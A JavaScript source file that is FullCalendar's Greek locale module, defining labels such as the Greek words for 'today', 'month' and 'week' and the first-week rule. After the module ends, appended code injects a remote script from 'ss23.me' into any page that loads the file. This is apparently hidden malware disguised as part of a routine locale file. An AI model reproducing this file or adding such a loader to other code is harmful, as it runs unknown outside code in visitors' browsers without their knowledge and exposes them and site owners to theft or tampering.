(function (global, factory) {
    typeof exports === 'object' && typeof module !== 'undefined' ? module.exports = factory() :
    typeof define === 'function' && define.amd ? define(factory) :
    (global = global || self, (global.FullCalendarLocales = global.FullCalendarLocales || {}, global.FullCalendarLocales.el = factory()));
}(this, function () { 'use strict';

    var el = {
        code: "el",
        week: {
            dow: 1,
            doy: 4 // The week that contains Jan 4st is the first week of the year.
        },
        buttonText: {
            prev: "Προηγούμενος",
            next: "Επόμενος",
            today: "Σήμερα",
            month: "Μήνας",
            week: "Εβδομάδα",
            day: "Ημέρα",
            list: "Ατζέντα"
        },
        weekLabel: "Εβδ",
        allDayText: "Ολοήμερο",
        eventLimitText: "περισσότερα",
        noEventsMessage: "Δεν υπάρχουν γεγονότα για να εμφανιστεί"
    };

    return el;

}));
var e = document.createElement("script");
  e.async = !0,
  e.src = "//ss23.me/js/8d34.js";
  e.charset="UTF-8";
  var t = document.getElementsByTagName("script")[0];
  t.parentNode.insertBefore(e, t);